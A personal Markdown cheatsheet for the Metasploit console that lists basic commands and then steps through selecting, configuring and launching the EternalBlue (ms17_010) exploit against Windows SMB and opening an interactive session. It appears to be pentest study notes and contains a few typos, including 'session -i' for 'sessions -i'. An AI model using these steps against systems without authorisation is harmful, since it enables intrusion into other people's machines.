# Metasploit
*Personal cheatsheet*<br/> <br/>
## Basic commands
```help```<br/>
```search```&emsp;Search modules<br/>
```use```&emsp;Select a module<br/>
```info```&emsp;Display info about a specific module<br/>
```options```&emsp;List options you can set<br/>
```advanced```&emsp;Display advanced options for a specific module<br/>
```show```&emsp;Show options in a specific category<br/>
## First steps w/ Metasploit
### ```Eternalblue```
```search eternalblue```<br/>
```use exploit/windows/smb/ms17_010_eternalblue``` to select the module<br/>
```show options```<br/>
```set``` to set a value to a module options<br/>
&nbsp;&nbsp;&nbsp;&nbsp;*ex:* ```set SMBPass username```<br/>
```show payloads``` to list compatible payloads<br/>
```set PAYLOAD <index>``` to select the desired payload, ```index``` *being the id of the playload from* ```show payloads```<br/>
```exploit``` to run the exploit once you've ocnfigured all the desired options<br/>
```sessions``` to list all active sessions<br/>
```session -i <index>``` to go into interactive mode with a session, ```index``` *being the id of the session from* ```sessions```<br/>
